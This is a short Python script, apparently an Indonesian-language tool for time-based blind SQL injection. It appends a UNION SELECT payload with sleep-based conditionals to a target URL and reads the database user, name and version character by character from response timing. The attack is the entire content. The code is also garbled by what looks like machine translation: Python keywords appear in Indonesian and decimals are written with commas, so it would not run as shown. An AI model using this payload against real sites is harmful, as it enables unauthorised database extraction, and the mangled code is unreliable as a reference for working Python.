# - * - coding: utf-8 - * -
# @Author: wongNdeso_godeyes
# @Tanggal: 2017-02-12 21:32:31
# @Lalu Dimodifikasi oleh: wongNdeso
# @Lalu Waktu yang membahas: 2017-02-12 21:32:42
impor sys
string impor
waktu impor , datetime
permintaan  impor
#Bannerprint 
"""\033[1;37m


.X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:                                              :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!                                                !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~                                             :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :                                     #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~                                      .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en                                                
                                                                                 Made with \033[91m<3\033[37m By wongNdeso\033[1;37m   |___/
    \033[0m"""

def  main ( url ):
    print ( ' Loding ... ' )
    print ( ' Mulai Serang .... ' )
    # payload = daftar (string.ascii_letters)
    payload =  daftar (string.ascii_lowercase)
    payload + = [ ' _ ' , ' . ' , ' @ ' , ' , ' , ' - ' ]
    payload + = [ str (num) untuk num dalam  rentang ( 0 , 10 )]
    maxLength =  30
    mengeksploitasi = []
    untuk i dalam  xrange (maxLength):
        untuk elemen dalam payload:
            t1 = time.time ()
            poc = url + " union select if ((ord (SUBSTR (concat_ws ('----', pengguna (), database (), versi ()), " + str (i + 1 ) + " , 1)) = ord (' " + elemen + " ')) = 1, tidur (0), tidur (0,5)), 2,3 "
            response = requests.get (poc)
            jika response.status_code == 200 :
                t2 = time.time ()
                jika t2 - t1 < 0,5 :
                    exploit.append (elemen)
                    print ( ' ' .join (mengeksploitasi) + ' ... ' )
                    terus
    cetak ( ' Selesai ... ' )
 bantuan def ():
    print ( ' ----- Penggunaan: ----- \ n ' )

jika  __name__  ==  ' __main__ ' :
    args = sys.argv
    jika  len (args) ==  3 :
        jika args [ 1 ] ==  ' -u ' :
            main (args [ 2 ])
        lain :
            help ()
    lain :
        help ()
